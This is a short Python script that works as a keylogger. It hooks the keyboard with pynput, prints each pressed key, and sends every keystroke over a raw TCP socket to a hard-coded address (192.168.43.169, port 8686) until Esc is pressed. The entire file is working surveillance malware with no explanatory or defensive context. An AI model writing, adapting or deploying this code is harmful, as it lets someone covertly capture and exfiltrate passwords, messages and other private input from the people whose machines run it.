import socket
import time
from pynput.keyboard import Key, Listener

def on_press(key):
	txt = str(key)     
	a=  txt.split("\'")
	print a[1]
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect(('192.168.43.169', 8686))
	client.send(a[1])
	client.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
